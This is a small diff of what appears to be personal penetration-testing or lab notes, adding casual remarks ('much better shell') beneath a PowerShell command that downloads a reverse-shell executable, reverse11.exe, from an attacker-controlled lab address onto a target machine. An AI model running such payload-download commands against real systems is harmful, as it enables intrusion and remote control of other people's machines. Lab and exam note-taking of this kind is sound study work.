@@ -135,3 +135,9 @@ Pull payload
 ```powershell
 iwr -uri "192.168.45.228:8888/reverse11.exe" -outfile "C:\Users\joe\Downloads\reverse11.exe"
 ```
+
+much better shell, lets try ftp again
+
+its there lettuce pray
+
+
